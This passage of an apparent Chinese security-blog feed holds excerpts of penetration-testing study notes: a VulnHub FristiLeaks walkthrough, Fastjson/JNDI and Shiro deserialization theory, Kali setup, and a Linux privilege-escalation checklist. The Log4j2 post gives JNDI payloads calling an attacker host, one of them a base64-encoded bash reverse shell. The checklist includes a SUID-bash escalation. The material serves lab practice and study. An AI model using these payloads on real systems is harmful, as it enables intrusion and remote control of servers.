&lt;p&gt;挂载：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEcbae99cfb08649110d01e9737809be5aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;复制bash:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEf2fcd1f0f1985c93ac9d89b0c0ccc2edimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE4bc21032b0ade087bef445dfab4984ceimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;给suid权限：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE527e2705a41a0115d43618593b91760dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEb492d226b2b3c0d82fa5f9d26c4ceb70image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x080 FristiLeaks1.3</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x080-fristileaks1.3/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x080-fristileaks1.3/</guid>
      <description>&lt;p&gt;看描述，要改mac地址：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE7cbcb733e1b1ee42b8d53ada55ff0c14image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE22cdc31d77af424071b51844e6dc9141image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透&#34;&gt;渗透&lt;/h1&gt;
&lt;p&gt;邪门儿，意思是说，这个页面的drink fristi的意思是，让我们看这个目录：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE65c8ce50c1eab3d9279d86dbc8b47767image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE00711889079ee7e4c9741a0adee9e51dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;把上面的base64替换掉，然后浏览器访问，搞出来是这个样子：&lt;/p&gt;
&lt;p&gt;keKkeKKeKKeKkEkkEk&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc79b22f8f077ee98fb42f631fa0e7dd0image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;admin不对：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE98303ddf7e04a91fc86195d5f496e617image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;但是eezeepz可以：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE0675063cfe06ab5933de6b18d090b2b1image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;随后是文件上传，能上传shell,jpg但是没有文件包含：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE4b9331c91a97b1f942286d5515ecaac2image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;呐应该是可以绕过，比较老生常谈的apache 解析漏洞：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEfddf28994a9b7122fe89c05508bac2f2image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE46dd7f085d3897b40b7f572a1251f847image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;在eezeepz的家目录下面发现了这样一句话：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEa068681661dd102587820abb194a3520image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;计划任务：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE9c40374329eefd3c82252362bc537fa6image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后，这里可以知道提示的原因是啥了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEa81f153d8cbee3660747b9236e5905c2image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后仔细看了一下，这些个命令，看看有啥能用的，其实我是想要创造一个属于admin用户的suid文件，然后提权的，但是试了半天没成功，看看网上的思路，是把admin用户的目录给777了：&lt;/p&gt;
&lt;p&gt;然后看了一下：&lt;/p&gt;
&lt;p&gt;这里面没有那么多命令，比图touch等，但是echo 和chmod有：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc3d83a01ccb4ac445f78281e18dba99eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;改一下脚本内容：&lt;/p&gt;
&lt;p&gt;需要先用admin用户创建一个所有人可读可写的cxk文件：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE67ad04eea8620e72fc19b6969f6e9af3image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;用当前用户修改cxk的内容为bash:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc9afa68897e0499c8a70f58b0675c429image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;重新写一个u+s权限即可：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEedd0bb03c921141f29f1c0fc7a04503aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEec93b43361685d7037a470fab09917c8image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;切换成admin了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE139b4ee36b30b18f65bd8348a0cb57e5image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;damin目录下：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE3b7ca5dc3c6e8d5320933e91933ac112image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;看样子是需要解密这串密文，还是比较好理解的，先是base64，然后rot13，想办法解开即可，这代码不难，只需要把en改成de即可：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE0bad58714866f72484684c3d959306aeimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEe8915ff60022cc426fb81603a61d2aa7image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>Fastjson</title>
      <link>https://yangzhuzai.github.io/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/fastjson/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/fastjson/</guid>
      <description>&lt;h1 id=&#34;一fastjson介绍&#34;&gt;一、FastJson介绍&lt;/h1&gt;
&lt;p&gt;Fastjson是Alibaba开发的Java语言编写的高性能JSON库，用于将数据在JSON和Java Object 之间互相转换，不需要添加额外的依赖，能够直接跑在JDK上，FastJson采用独创的算法，将序列化的速度提升到极致，深受用户喜爱。产品主要提供两个接口 JSON.toJSONString 和 JSON.parseObject/JSON.parse 来分别实现序列化和反序列化操作。&lt;/p&gt;
&lt;h1 id=&#34;二漏洞原理&#34;&gt;二、漏洞原理&lt;/h1&gt;
&lt;p&gt;fastjson的漏洞涉及几个重要概念，深入理解一些概念后才能理解为什么会出现这种情况，以及一些面试官为什么会问一些奇怪的问题，比如fastjson不出网利用、如何判断版本等；&lt;/p&gt;
&lt;h2 id=&#34;21-jndi注入的前置知识&#34;&gt;2.1 JNDI注入的前置知识&lt;/h2&gt;
&lt;h3 id=&#34;211-java-bean&#34;&gt;2.1.1 Java Bean&lt;/h3&gt;
&lt;p&gt;一类满足标准写法的类，满足以下条件的Java类可以称之为Java Bean。&lt;/p&gt;
&lt;p&gt;1、成员变量均使用private关键字进行修饰&lt;/p&gt;
&lt;p&gt;2、提供构造方法(有参/无参)&lt;/p&gt;
&lt;p&gt;3、为每个成员变量提供set/get方法&lt;/p&gt;
&lt;h3 id=&#34;212-反射&#34;&gt;2.1.2 反射&lt;/h3&gt;
&lt;p&gt;一种可以调用任意类任意方法的类；&lt;/p&gt;
&lt;h3 id=&#34;213-序列化和反序列化&#34;&gt;2.1.3 序列化和反序列化&lt;/h3&gt;
&lt;p&gt;远程数据传输，不安全的反序列化可以造成RCE；&lt;/p&gt;
&lt;h3 id=&#34;214-jndi&#34;&gt;2.1.4 JNDI&lt;/h3&gt;
&lt;p&gt;Java名称与目录服务接口，可以理解为一个强大的通讯录，可以定位用户、网络、对象、机器等等资源&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/zj_img/WEBRESOURCE0cc7bd9389f51609d1ea7294c65b0e20image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;在实战利用中，常见的服务为LDAP、DNS、RMI，具体的代码实现效果为，如果lookup可控就可以导致JNDI注入&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;InitialContext context = new InitialContext();
context.lookup(&amp;#34;rmi://localhost:1099/HelloService&amp;#34;);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;具体流程如下：&lt;/p&gt;
&lt;p&gt;1、目标代码中调用了InitialContext.lookup(URI)，且URI为用户可控； &lt;/p&gt;
&lt;p&gt;2、攻击者控制URI参数为恶意的RMI服务地址，如：rmi://hacker_rmi_server//name； &lt;/p&gt;
&lt;p&gt;3、攻击者RMI服务器向目标返回一个Reference对象，Reference对象中指定某个精心构造的Factory类； &lt;/p&gt;
&lt;p&gt;4、目标在进行lookup()操作时，会动态加载并实例化Factory类，接着调用factory.getObjectInstance()获取外部远程对象实例； &lt;/p&gt;
&lt;p&gt;5、攻击者可以在Factory类文件的&lt;/p&gt;
&lt;p&gt;另外一种解释：&lt;/p&gt;
&lt;p&gt;JNDI支持将一个名称映射到一个Java对象,可以通过JNDI中的lookup函数向特定的提供命名服务的服务器发起查询请求获取具体对象。lookup函数可以向远程的提供目录服务的服务器发起请求查询指定对象，如果返回的是Reference类型的对象，JNDI会解析该对象的classFactory、classFactoryLocation属性。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;一些版本注入的问题：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;RMI攻击主要分3种目标：RMI Client、RMI Server、RMI Registry。
使用远程Reference字节码进行攻击。（最初始的方式，没有任何拦截）
从jdk8u121开始，RMI加入了反序列化白名单机制，JRMP的payload登上舞台，这里的
payload指的是ysoserial修改后的JRMPClient。（黑名单拦截一些类的截断）
从jdk8u121开始，RMI远程Reference代码默认不信任，RMI远程Reference代码攻击
方式开始失效。（直接不信任rmi）
从jdk8u191开始，LDAP远程Reference代码默认不信任，LDAP远程Reference代码攻
击方式开始失效，需要通过javaSerializedData返回序列化gadget方式实现攻击。
（直接不信任ldap，这以后基本都是基于本地的gadget去做复现了））
RMI服务端执行bind，我们就可以攻击RMI Registry注册中心，导致其反序列化RCE。
RMI客户端使用lookup方法理论上可以主动攻击RMI Registry
RMI Registry在RMI客户端使用lookup方法的时候，可以实现被动攻击RMI客户端
来看一下这个路程
（1）先开始什么都没有处理，rmi开启的端口可以直接发送数据过去被反序列化
（2）发现不对劲，所以java增加了黑名单机制（细节这里没讲），所以开始利用
jrmp的payload（其实就是绕过了黑名单能发送数据的类）
（3）后续rmi被不信任以后，研究人员发现了ldap也可以远程加载目录，ldap登上了
舞台
（4）ldap也被不信任，相当于无法远程加载，目前给的方法就是直接打过去让本
地存在的链子命令执行，不需要像外部做加载。
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;高版本注入的解决办法：&lt;/strong&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>kali 环境爬坑</title>
      <link>https://yangzhuzai.github.io/posts/oscp/kali-%E7%8E%AF%E5%A2%83%E7%88%AC%E5%9D%91/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/oscp/kali-%E7%8E%AF%E5%A2%83%E7%88%AC%E5%9D%91/</guid>
      <description>&lt;p&gt;python2 安装pip问题：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
python2 get-pip.py
python2 -m pip install --upgrade setuptools -i https://pypi.tuna.tsinghua.edu.cn/simple
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;pip2 安装impacket:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;python2 -m pip install impacket==0.9.22
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;kali安装bloodhound&#34;&gt;kali安装bloodhound&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo apt-get install neo4j
sudo neo4j console
控制台默认账密：neo4j
配置好后，安装bloodhound
sudo apt-get install bloodhound
输入修改后的密码

ps1脚本使用：
Import-Module ./SharpHound.ps1; Invoke-BloodHound -c all
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;kali-使用impacket--docker&#34;&gt;kali 使用impacket&amp;ndash;docker&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;安装docker
apt-get install docker.io
systemctl start docker

下载相关文件夹：
构建 Impacket 的镜像：
docker build -t &amp;#34;impacket:latest&amp;#34; .
使用 Impacket 的镜像：
docker run -it --rm &amp;#34;impacket:latest&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;安装impacket--推荐此方式&#34;&gt;安装impacket&amp;ndash;推荐此方式&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;git clone https://github.com/CoreSecurity/impacket.git 
cd impacket/ 
python3 -m pip install . 
sudo python3 setup.py install
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;no-module-named-crypto&#34;&gt;No module named &amp;ldquo;Crypto&amp;rdquo;&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;解决方案：
pip install pycryptodome
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;openvpn-over-socsk5&#34;&gt;openvpn over socsk5&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;socks-proxy 192.168.5.2 7890
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;etcsambasmbconf-配置&#34;&gt;/etc/samba/smb.conf 配置&lt;/h1&gt;
&lt;p&gt;注释：&lt;/p&gt;</description>
    </item>
    <item>
      <title>Linux 提权</title>
      <link>https://yangzhuzai.github.io/posts/oscp/linux-%E6%8F%90%E6%9D%83/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/oscp/linux-%E6%8F%90%E6%9D%83/</guid>
      <description>&lt;p&gt;添加路由：
sudo route add -net 192.168.245.1 netmask 255.255.255.0 gw 192.168.45.254
sudo route add -net &amp;lt;目标网络&amp;gt; netmask &amp;lt;掩码&amp;gt; gw &amp;lt;网关地址&amp;gt;&lt;/p&gt;
&lt;p&gt;有gcc先考虑内核提权，存在少量情况是没有GCC，交叉编译；&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;chmod u+s /bin/bash
/bin/bash -p 
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;提权手动千万注意细节文件计划任务特殊进程&#34;&gt;提权手动，千万注意细节，文件、计划任务特殊、进程&lt;/h1&gt;
&lt;p&gt;1、SUID：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;find / -perm -u=s -type f 2&amp;gt;/dev/null
类似效果
/usr/sbin/getcap -r / 2&amp;gt;/dev/null
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;2、交互式shell:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;python3 -c &amp;#39;import pty;pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;3、/etc/crontab ！！！ 手动检查&lt;/p&gt;
&lt;p&gt;ls -lah /etc/cron*&lt;/p&gt;
&lt;p&gt;重点看&lt;strong&gt;小时&lt;/strong&gt;和&lt;strong&gt;cron.d&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;4、sudo -l&lt;/p&gt;
&lt;p&gt;5、数据库账密信息&lt;/p&gt;
&lt;p&gt;6、家目录文件&lt;/p&gt;
&lt;p&gt;7、文件可写：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;/etc/passwd
/etc/shadow
/etc/sudoers
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;8、内核信息：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;uname -a    ##打印所有可用的系统信息
uname -r    ##内核版本
uname -n    ##系统主机名。
uname -m    ##查看系统内核架构（64位/32位）
hostname    ##系统主机名
cat /proc/version    ##内核信息
cat /etc/*-release   ##分发信息
cat /etc/issue       ##分发信息
cat /proc/cpuinfo    ##CPU信息
cat /etc/lsb-release   ##Debian 
cat /etc/redhat-release  ##Redhat
ls /boot | grep vmlinuz-


常用方法：
1、确认内核版本：
cat /etc/issue 发行版
uname -r 内核
arch 架构

2、筛选：
searchsploit &amp;#34;linux kernel Ubuntu 16 Local Privilege Escalation&amp;#34;   | grep  &amp;#34;4.&amp;#34; | grep -v &amp;#34; &amp;lt; 4.4.0&amp;#34; | grep -v &amp;#34;4.8&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;9、.bashrc&lt;/p&gt;</description>
    </item>
    <item>
      <title>Log4j2</title>
      <link>https://yangzhuzai.github.io/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/log4j2/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/log4j2/</guid>
      <description>&lt;h1 id=&#34;一log4j2&#34;&gt;一、Log4j2&lt;/h1&gt;
&lt;p&gt;Log4j是Apache的一个开源项目，通过使用Log4j，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。&lt;/p&gt;
&lt;p&gt;​ Log4j在工程中可以易用，方便等代替了 System.out 等打印语句，它是Java下最流行的日志输入工具，一些著名的开源项目，像spring、hibernate、struts都使用该工具作为日志输入工具，可以帮助调试（有时候debug是发挥不了作用的）和分析。&lt;/p&gt;
&lt;h1 id=&#34;二漏洞原理&#34;&gt;二、漏洞原理&lt;/h1&gt;
&lt;p&gt;由于log4j2库中的JNDI查询功能存在反序列化漏洞，具体来说是由于log4j2在处理日志事件时，使用了java反序列化机制(java Serialization)对java的对象和反序列化操作,没有对反序列化中的过程做安全的验证措施
导致可以构造恶意的JNDI名称的特殊日志来触发log4j2库中的JndiLookup.deserialized()方法调用，在执行反序操作时，可以利用java反序列漏洞，将恶意的代码注入到反序列化对象中，从而实现远程命令攻击。&lt;/p&gt;
&lt;p&gt;来看一下正常使用的代码：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
 
public class Log4j2Test {
    private static  final Logger logger = LogManager.getLogger();
    public static void main(String[] args) {
        String username = &amp;#34;world&amp;#34;;
        logger.error(&amp;#34;hello {}&amp;#34;,username);
    }
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;正常这里会传入log4j2，hello word，如果我们传入${java:version}则会记录java版本， 大致的调用链如下：&lt;/p&gt;
&lt;p&gt;MessagePatternConverter.format()会对&lt;code&gt;${&lt;/code&gt;进行检测识别，并调用StrSubstitutor.replace()对传入的值进行处理StrSubstitutor类中多个方法处理到StrSubstitutor.substitute()将${jndi:rmi://192.168.198.134:9999/exp}处理解析为jndi:rmi://192.168.198.134:9999/exp后并调用resolveVariable()
StrSubstitutor.resolveVariable()调用lookup方法
判断识别jndi的处理类JndiLookup
JndiLookup.lookup()调用JndiManager.getDefaultManager()获得context
并通过JndiManager.lookup()调用java自身的InitialContext.lookup()，InitialContext类是执行命名操作的初始上下文，所有命名操作都相对于某一上下文，该初始上下文实现 Context 接口并提供解析名称的起始点，通过lookup()检索&lt;/p&gt;
&lt;p&gt;到最后一步，如果看不明白可以详细查看JNDI注入的相关内容。&lt;/p&gt;
&lt;h1 id=&#34;三漏洞发现&#34;&gt;三、漏洞发现&lt;/h1&gt;
&lt;p&gt;由于日志框架，只能哪里有空哪里插，目前依赖于插件以及xray等工具进行检测&lt;/p&gt;
&lt;p&gt;影响范围：Apache Log4j 2.x&amp;lt;=2.14.1&lt;/p&gt;
&lt;h1 id=&#34;四漏洞利用&#34;&gt;四、漏洞利用&lt;/h1&gt;
&lt;p&gt;开启log4j2的JNDI注入工具：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;java -jar JNDIExploit-1.4-SNAPSHOT.jar -i 192.168.2.40
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;值得注意的是，此处的IP不能为回环地址，而必须为使用的IP地址&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/zj_img/WEBRESOURCEf4a59216cb0105b4103e10fc35a7697b%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发送恶意payload:&lt;/p&gt;
&lt;p&gt;基础payload:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;${jndi:ldap://dadad.ceye.io}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;反弹shell：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;${jndi:ldap://10.10.14.147:1389/Basic/ReverseShell/10.10.14.147/8888}  实战中有失败案例
${jndi:ldap://10.10.14.147:1389/ldap://10.10.14.147:1389/Basic/Command/Base64/YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNDcvODg4OCAwPiYx}  使用较多
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;另外一个工具的使用方式：&lt;/strong&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>shiro</title>
      <link>https://yangzhuzai.github.io/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/shiro/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/shiro/</guid>
      <description>&lt;h1 id=&#34;一shiro&#34;&gt;一、shiro&lt;/h1&gt;
&lt;p&gt;Apache Shiro是用来做认证和授权的框架，执行身份验证、授权、密码和会话管理。&lt;/p&gt;
&lt;p&gt;Shiro主要配合一些容器的使用，如Tomcat、Weblogic等；同时有些框架也会将Shiro集成用来做身份认证和授权，比如：SpringBoot等；&lt;/p&gt;
&lt;h1 id=&#34;二漏洞原理&#34;&gt;二、漏洞原理&lt;/h1&gt;
&lt;h3 id=&#34;cve-2016-4437shiro-550&#34;&gt;CVE-2016-4437/Shiro-550&lt;/h3&gt;
&lt;p&gt;Shiro &amp;lt; 1.2.5&lt;/p&gt;
&lt;p&gt;第1个注意的事项：要在response中返回含有remenberMe的字段对应的请求中去构造poc&lt;/p&gt;
&lt;p&gt;第2个注意的事项 ：获取cookies的请求包resquest的必须是登录提交的http请求&lt;/p&gt;
&lt;p&gt;（1）shiro在登录处提供了Remember Me这个功能，来记录用户登录的凭证，然后shiro会对用户传入的cookie进行解密并进行反序列化，服务端接收rememberMe的cookie值后的操作是：&lt;/p&gt;
&lt;p&gt;Cookie中rememberMe字段内容&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;    ---&amp;gt; Base64解码       		      


                     ---&amp;gt; 使用密钥进行AES-CBC解密            			 


                                                ---&amp;gt; 反序列化
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;（2）由于该版本AES加密的密钥Key被硬编码在代码里（漏洞能够被利用的本质），且大部分项目未修改默认AES密钥，这意味着攻击者只要通过源代码找到AES加密的密钥，就可以构造一个恶意对象，对其进行序列化，AES加密，Base64编码，然后将其作为cookie的Remember Me字段值发送，Shiro将数据进行解密并且反序列化，最终触发反序列化漏洞。&lt;/p&gt;
&lt;p&gt;官方针对这个漏洞的修复方式将使用默认硬编码的Key改为生成随机的Key加密。&lt;/p&gt;
&lt;p&gt;密钥保存位置：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/zj_img/WEBRESOURCEe42a394535820c01dae3f4e45464ea1dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;最后的触发位置是标准的readobject()，所以利用链基本上就是CC链或者其他依赖链了。&lt;/p&gt;
&lt;h3 id=&#34;cve-2019-12422shiro-721&#34;&gt;CVE-2019-12422/Shiro-721&lt;/h3&gt;
&lt;p&gt;Shiro &amp;lt; 1.4.2&lt;/p&gt;
&lt;p&gt;在Apache Shiro 中用户进行登录的时候, 提供RemenberMe功能处理cookie，使用的是AES-128-CBC加密，可以通过Padding Oracle加密生成的攻击代码来重新构造一个恶意的rememberMe字段，可进行反序列化攻击。&lt;/p&gt;
&lt;p&gt;跟Shiro无关，而是对Shiro采用的加密方式进行的攻击，所以略过，只要了解了Padding Oracle Attack 原理就能理解这个攻击的原理，这里推荐Padding Oracle Attack(填充提示攻击)详解及验证。&lt;/p&gt;
&lt;p&gt;简单来说，Padding Oracle Attack是根据CBC字节翻转攻击、Padding规则以及服务端解密后返回的不同状态来穷举中间值进而获取明文的攻击。解密出的明文填充的正确与否可通过服务端的响应进行区分。通过不断调整发送的密文分组，然后根据服务端的结果进行爆破测试，可推测出确定的解密值。当应用程序接受到加密后的值以后，可能有以下三种返回：&lt;/p&gt;
&lt;p&gt;1、接受到正确的密文之后（填充正确且包含正确的值），应用程序正常返回：200 OK。&lt;/p&gt;
&lt;p&gt;2、接受到合法的密文（填充正确，但解密后得到一个不正确的值），应用程序显示自定义错误消息：200 OK。&lt;/p&gt;
&lt;p&gt;3、接受到非法的密文之后（解密后发现填充不正确），应用程序抛出一个解密异常：500 Internal Server Error。&lt;/p&gt;
&lt;p&gt;我们不需要要求解密后必须是正确的值，只要返回200 ok即可。&lt;/p&gt;
&lt;p&gt;aes gcm加密方式不一样的&lt;/p&gt;
